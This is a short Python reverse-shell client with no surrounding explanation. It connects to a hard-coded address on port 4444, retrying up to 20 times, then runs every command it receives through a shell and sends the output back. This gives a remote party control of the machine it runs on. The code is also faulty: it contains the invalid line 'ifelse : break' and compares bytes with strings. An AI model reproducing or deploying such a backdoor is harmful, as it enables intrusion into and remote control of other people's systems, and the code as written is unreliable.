import socket
import subprocess
import time 

s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)

host= "172.0.0.1"
port= 4444

for i in range(20):
    try:
        s.connect((host,port))
        break
    except:
        time.sleep(5)

        
while  True:
    data=s.recv(1024)
    if data !="":
        data= str(data,"utf-8")
    if data == "exits" :
           break
    else: 
         Proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output = Proc.stdout.read()+Proc.stderr.read()
         s.send(output)

    ifelse : break
s.close(
     
)